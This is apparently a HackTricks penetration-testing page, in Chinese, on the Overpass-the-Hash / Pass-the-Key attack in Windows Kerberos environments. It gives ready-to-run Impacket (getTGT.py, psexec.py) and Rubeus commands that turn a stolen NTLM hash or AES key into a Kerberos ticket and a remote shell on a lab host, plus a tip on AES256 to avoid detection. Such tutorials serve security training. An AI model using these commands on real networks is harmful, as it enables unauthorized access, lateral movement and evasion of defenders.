# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** 攻击旨在传统 NTLM 协议受到限制且 Kerberos 认证优先的环境中。此攻击利用用户的 NTLM 哈希或 AES 密钥来请求 Kerberos 票证，从而实现对网络内资源的未经授权访问。

要执行此攻击，第一步涉及获取目标用户帐户的 NTLM 哈希或密码。在获取此信息后，可以为该帐户获取票证授予票证 (TGT)，允许攻击者访问用户拥有权限的服务或机器。

该过程可以通过以下命令启动：
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
对于需要 AES256 的场景，可以使用 `-aesKey [AES key]` 选项。此外，获取的票证可以与各种工具一起使用，包括 smbexec.py 或 wmiexec.py，从而扩大攻击范围。

遇到的问题，如 _PyAsn1Error_ 或 _KDC cannot find the name_，通常通过更新 Impacket 库或使用主机名而不是 IP 地址来解决，以确保与 Kerberos KDC 的兼容性。

使用 Rubeus.exe 的替代命令序列展示了该技术的另一个方面：
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
该方法与**Pass the Key**方法相似，重点在于直接控制和利用票证进行身份验证。需要注意的是，TGT请求的启动会触发事件`4768: A Kerberos authentication ticket (TGT) was requested`，这表明默认使用RC4-HMAC，尽管现代Windows系统更倾向于使用AES256。

为了符合操作安全并使用AES256，可以应用以下命令：
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## 参考

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
